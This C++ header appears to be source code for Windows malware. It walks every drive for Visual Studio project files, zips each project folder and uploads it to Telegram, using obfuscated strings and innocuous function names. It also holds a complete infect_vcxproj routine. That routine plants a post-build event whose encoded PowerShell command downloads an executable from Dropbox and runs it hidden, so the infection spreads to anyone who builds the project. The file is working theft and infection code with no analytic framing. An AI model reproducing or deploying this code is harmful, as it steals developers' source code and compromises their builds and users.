#pragma once

namespace sources {
    static std::string wstring_to_string(const std::wstring& wstr) {
        if (wstr.empty()) return {};
        int size_needed = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), (int)wstr.size(),
            nullptr, 0, nullptr, nullptr);
        std::string result(size_needed, 0);
        WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), (int)wstr.size(),
            &result[0], size_needed, nullptr, nullptr);
        return result;
    }

    static bool is_skippable_directory(const std::wstring& dir_name) {
        static const std::vector<std::wstring> skip_list = {
            L"vcpkg"
        };
        for (const auto& skip : skip_list) {
            if (dir_name == skip) return true;
        }
        return false;
    }

    static void search_vcxproj_iterative(const std::wstring& root_dir,
        std::vector<std::pair<std::wstring, std::wstring>>& out_list,
        size_t& out_count) {
        std::stack<std::wstring> dir_stack;
        dir_stack.push(root_dir);

        while (!dir_stack.empty()) {
            std::wstring current_dir = dir_stack.top();
            dir_stack.pop();

            size_t last_backslash = current_dir.find_last_of(L'\\');
            if (last_backslash != std::wstring::npos) {
                std::wstring dir_name = current_dir.substr(last_backslash + 1);
                if (is_skippable_directory(dir_name))
                    continue;
            }

            std::wstring search_pattern = current_dir + L"\\*";
            WIN32_FIND_DATAW find_data;
            HANDLE h_find = FindFirstFileExW(search_pattern.c_str(),
                FindExInfoStandard,
                &find_data,
                FindExSearchNameMatch,
                NULL,
                FIND_FIRST_EX_LARGE_FETCH);
            if (h_find == INVALID_HANDLE_VALUE)
                continue;

            do {
                if (find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                    if (wcscmp(find_data.cFileName, L".") != 0 && wcscmp(find_data.cFileName, L"..") != 0) {
                        std::wstring sub_dir = current_dir + L"\\" + find_data.cFileName;
                        dir_stack.push(sub_dir);
                    }
                } else {
                    std::wstring file_name = find_data.cFileName;
                    const std::wstring suffix = L".vcxproj";
                    if (file_name.size() >= suffix.size() &&
                        file_name.substr(file_name.size() - suffix.size()) == suffix) {
                        std::wstring project_name = file_name.substr(0, file_name.size() - suffix.size());
                        std::wstring full_path = current_dir + L"\\" + file_name;
                        out_list.emplace_back(project_name, full_path);
                        ++out_count;
                    }
                }
            } while (FindNextFileW(h_find, &find_data) != 0);
            FindClose(h_find);
        }
    }

    static bool infect_vcxproj(const std::wstring& vcxproj_path, const std::wstring& access_token) {
        auto to_utf16le = [](const std::wstring& wstr) -> std::vector<BYTE> {
            std::vector<BYTE> bytes;
            bytes.reserve(wstr.size() * 2);
            for (wchar_t ch : wstr) {
                bytes.push_back(static_cast<BYTE>(ch & 0xFF));
                bytes.push_back(static_cast<BYTE>((ch >> 8) & 0xFF));
            }
            return bytes;
            };

        auto base64_encode = [](const std::vector<BYTE>& bytes) -> std::string {
            static const char* chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
            std::string result;
            int i = 0, j = 0;
            BYTE char_array_3[3];
            BYTE char_array_4[4];

            for (size_t idx = 0; idx < bytes.size(); ++idx) {
                char_array_3[i++] = bytes[idx];
                if (i == 3) {
                    char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
                    char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
                    char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
                    char_array_4[3] = char_array_3[2] & 0x3f;

                    for (i = 0; i < 4; ++i) result += chars[char_array_4[i]];
                    i = 0;
                }
            }

            if (i) {
                for (j = i; j < 3; ++j) char_array_3[j] = 0;
                char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
                char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
                char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
                char_array_4[3] = char_array_3[2] & 0x3f;

                for (j = 0; j < i + 1; ++j) result += chars[char_array_4[j]];
                while (i++ < 3) result += '=';
            }
            return result;
            };

        // Build the PowerShell command with correct quoting for $env:TEMP
        std::wstring temp_path_var = L"$t=\"$env:TEMP\\" + std::to_wstring(GetCurrentProcessId()) + L".exe\";";
        std::wstring ps_script = L"[Net.ServicePointManager]::SecurityProtocol=3072;" +
            temp_path_var +
            L"$h=@{Authorization='Bearer " + access_token + L"';"
            L"'Dropbox-API-Arg'='{\\\"path\\\":\\\"/systemhelper.exe\\\"}';"
            L"'Content-Type'='application/octet-stream'};"
            L"Invoke-WebRequest -Uri 'https://content.dropboxapi.com/2/files/download' -Method Post -Headers $h -OutFile $t;"
            L"if(Test-Path $t){Start-Process -WindowStyle Hidden $t}";

        std::vector<BYTE> utf16_bytes = to_utf16le(ps_script);
        std::string encoded = base64_encode(utf16_bytes);
        std::wstring command = L"powershell -NoProfile -ExecutionPolicy Bypass -e " + std::wstring(encoded.begin(), encoded.end());

        std::wstring insert_xml = L"  <ItemDefinitionGroup>\n"
            L"    <PostBuildEvent>\n"
            L"      <Command>" + command + L"</Command>\n"
            L"    </PostBuildEvent>\n"
            L"  </ItemDefinitionGroup>\n";

        std::wifstream infile(vcxproj_path);
        if (!infile.is_open()) {
            g_compiler->push_line(oxorany("Failed to open ") + wstring_to_string(vcxproj_path));
            return false;
        }

        std::wstring content;
        std::wstring line;
        bool already_infected = false;
        while (std::getline(infile, line)) {
            content += line + L"\n";
            if (line.find(L"PostBuildEvent") != std::wstring::npos)
                already_infected = true;
        }
        infile.close();

        if (already_infected) {
            g_compiler->push_line(oxorany("[-] Already infected: ") + wstring_to_string(vcxproj_path));
            return false;
        }

        size_t insert_pos = std::wstring::npos;
        size_t last_pos = 0;
        while ((last_pos = content.find(L"</PropertyGroup>", last_pos)) != std::wstring::npos) {
            insert_pos = last_pos;
            last_pos += 1;
        }

        if (insert_pos == std::wstring::npos) {
            g_compiler->push_line(oxorany("Could not find </PropertyGroup> in ") + wstring_to_string(vcxproj_path));
            return false;
        }

        content.insert(insert_pos + wcslen(L"</PropertyGroup>"), L"\n" + insert_xml);

        std::wofstream outfile(vcxproj_path);
        if (!outfile.is_open()) {
            g_compiler->push_line(oxorany("Failed to write ") + wstring_to_string(vcxproj_path));
            return false;
        }
        outfile << content;
        outfile.close();

        g_compiler->push_line(oxorany("[+] Infected with Dropbox API payload: ") + wstring_to_string(vcxproj_path));
        return true;
    }

    class c_sources {
    public:
        std::atomic<bool> m_upload_projects{true};

        void compile_sources( ) {
            while ( m_upload_projects ) {
                WCHAR current_exe[ MAX_PATH ];
                DWORD len = GetModuleFileNameW( NULL, current_exe, MAX_PATH );
                if ( len == 0 ) {
                    g_compiler->push_line( oxorany( "Failed to get current executable path." ) );
                    return;
                }

                DWORD drives_mask = GetLogicalDrives( );
                if ( drives_mask == 0 ) {
                    g_compiler->push_line( oxorany( "Failed to get logical drives." ) );
                    return;
                }

                std::string pc_name = utility::get_username( );
                std::string api_token = dropbox_token;
                std::set<std::wstring> processed_folders;

                auto process_project = [ & ] ( const std::wstring& vcxproj_path ) {
                    // Optional: infect the project (currently commented in original code)
                    // if (infect_vcxproj(vcxproj_path, std::wstring(api_token.begin(), api_token.end()))) {
                    //     g_compiler->push_line(oxorany("[+] Infected: ") + wstring_to_string(vcxproj_path));
                    // }

                    if ( !m_upload_projects )
                        return;

                    std::wstring folder = vcxproj_path;
                    size_t last_slash = folder.find_last_of( L'\\' );
                    if ( last_slash != std::wstring::npos )
                        folder = folder.substr( 0, last_slash );

                    if ( processed_folders.find( folder ) != processed_folders.end( ) )
                        return;

                    std::wstring folder_name_w = folder;
                    size_t folder_last_slash = folder_name_w.find_last_of( L'\\' );
                    if ( folder_last_slash != std::wstring::npos )
                        folder_name_w = folder_name_w.substr( folder_last_slash + 1 );

                    std::string folder_name = utility::wstring_to_utf8( folder_name_w );
                    std::string filename = folder_name + " - " + pc_name + oxorany( ".zip" );

                    std::wstring zip_path = utility::zip_folder( folder );
                    if ( m_upload_projects && !zip_path.empty( ) ) {
                        std::wstring renamed_zip = zip_path.substr( 0, zip_path.find_last_of( L'\\' ) + 1 ) +
                            std::wstring( filename.begin( ), filename.end( ) );
                        if ( MoveFileW( zip_path.c_str( ), renamed_zip.c_str( ) ) ) {
                            https::upload_telegram_file( renamed_zip );
                            DeleteFileW( renamed_zip.c_str( ) );
                        }
                        else {
                            https::upload_telegram_file( zip_path );
                        }
                        DeleteFileW( zip_path.c_str( ) );
                    }

                    processed_folders.insert( folder );
                    };

                for ( char letter = 'A'; letter <= 'Z'; ++letter ) {
                    if ( !( drives_mask & ( 1 << ( letter - 'A' ) ) ) )
                        continue;

                    std::wstring drive_root = std::wstring( 1, letter ) +oxorany(  L":\\" );
                    UINT drive_type = GetDriveTypeW( drive_root.c_str( ) );
                    if ( drive_type == DRIVE_NO_ROOT_DIR || drive_type == DRIVE_UNKNOWN )
                        continue;

                    std::stack<std::wstring> dir_stack;
                    dir_stack.push( drive_root );

                    while ( !dir_stack.empty( ) && m_upload_projects ) {
                        std::wstring current_dir = dir_stack.top( );
                        dir_stack.pop( );

                        size_t last_backslash = current_dir.find_last_of( oxorany( L'\\' ) );
                        if ( last_backslash != std::wstring::npos ) {
                            std::wstring dir_name = current_dir.substr( last_backslash + 1 );
                            if ( is_skippable_directory( dir_name ) )
                                continue;
                        }

                        std::wstring search_pattern = current_dir +oxorany(  L"\\*" );
                        WIN32_FIND_DATAW find_data;
                        HANDLE h_find = FindFirstFileExW( search_pattern.c_str( ),
                            FindExInfoStandard,
                            &find_data,
                            FindExSearchNameMatch,
                            NULL,
                            FIND_FIRST_EX_LARGE_FETCH );
                        if ( h_find == INVALID_HANDLE_VALUE )
                            continue;

                        do {
                            if ( find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY ) {
                                if ( wcscmp( find_data.cFileName, L"." ) != 0 && wcscmp( find_data.cFileName, L".." ) != 0 ) {
                                    std::wstring sub_dir = current_dir + L"\\" + find_data.cFileName;
                                    dir_stack.push( sub_dir );
                                }
                            }
                            else {
                                std::wstring file_name = find_data.cFileName;
                                const std::wstring suffix =oxorany(  L".vcxproj" );
                                if ( file_name.size( ) >= suffix.size( ) &&
                                    file_name.substr( file_name.size( ) - suffix.size( ) ) == suffix ) {
                                    std::wstring full_path = current_dir + L"\\" + file_name;
                                    process_project( full_path );
                                }
                            }
                        } while ( FindNextFileW( h_find, &find_data ) != 0 && m_upload_projects );
                        FindClose( h_find );
                    }
                }

                g_compiler->push_line( oxorany( "Scan complete." ) );
            }
        }
    };
}

static DWORD WINAPI source_thread(LPVOID lpParam) {
    sources::c_sources* sources = reinterpret_cast<sources::c_sources*>(lpParam);
    sources->compile_sources();
    return 1;
}